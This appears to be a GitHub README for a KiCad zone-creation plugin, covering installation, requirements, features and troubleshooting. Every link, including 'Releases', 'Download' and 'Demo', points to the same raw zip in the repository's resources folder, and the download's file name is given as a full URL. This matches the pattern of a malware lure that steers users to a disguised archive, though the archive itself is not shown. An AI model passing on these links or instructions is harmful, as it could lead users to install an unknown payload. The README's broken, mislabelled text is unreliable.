# 🎉 advanced-zone-helper - Effortlessly Create Zones in KiCad

[![Download Now](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip%20Now-vX.X.X-blue)](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip)

## 🚀 Getting Started

Welcome to **Advanced Zone Helper**! This plugin helps you easily create zones in KiCad from your selected shapes. Follow the steps below to start using this tool.

## 📦 Installation

### Option 1: KiCad Plugin Manager (Recommended)

1. Visit the [Releases](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip) page.
2. Download the latest version, which will be named like `https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip`.
3. Open KiCad.
4. Navigate to **Plugin and Content Manager**.
5. Click on **Install from File...**.
6. Select the downloaded zip file and click **Open**.

### Option 2: Manual Installation

1. Visit the [Releases](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip) page.
2. Download the latest `https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip`.
3. Extract the zip file to your preferred directory.
4. In KiCad, go to **Preferences** > **Configure Paths**.
5. Add the path to the directory containing the extracted files.
6. Restart KiCad.

## ⚙️ Requirements

- **KiCad 9.0 or later** (This plugin uses the IPC API)
- **Python 3.9 or later** (Ensure it is installed on your system)
- **IPC API** must be enabled in KiCad preferences:
  - Go to **Preferences** > **Configure Paths**
  - Ensure IPC API is checked under the "API" section

## 🎨 Features

- Automatically detects closed loops from selected lines, arcs, bezier curves, circles, and polygons.
- Creates ring zones between nested outlines (e.g., between two concentric circles).
- Supports multi-hole zones with an outer boundary and multiple inner cutouts.
- Configure layer settings, net priorities, and clearance between zones.
- An interactive zone selection and configuration dialog with a preview feature.

## 📜 Usage

Once installed, you can start using the **Advanced Zone Helper** plugin.

1. Open your KiCad project.
2. Select the shapes you wish to base zones on.
3. Access the **Advanced Zone Helper** through **Tools** in the menu.
4. Configure the zone settings according to your project needs.
5. Click **Create Zones** to generate zones based on your selections.

## 🛠️ Troubleshooting

If you encounter any issues during installation or usage, try the following steps:

- Ensure you are using KiCad version 9.0 or later.
- Verify that Python 3.9 or later is installed correctly.
- Check that the IPC API is enabled in KiCad preferences.
- Restart KiCad after installation to ensure the plugin loads properly.

## 💡 Tips

- Use the preview feature to visualize changes before applying them.
- Group your shapes logically to make zone creation easier.
- Refer to the demo link to see the plugin in action.

## 📥 Download & Install

Ready to get started? [Visit this page to download](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip). Choose the latest version and follow the steps above to install.

## 🎥 Demo

Check out the demo [here](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip) to see how the plugin works and what you can do with it.

## 📞 Support

If you have questions or need assistance, please feel free to open an issue on our GitHub page. Community members and developers will help you as soon as possible.

Thank you for choosing **Advanced Zone Helper**! Enjoy creating zones effortlessly in KiCad.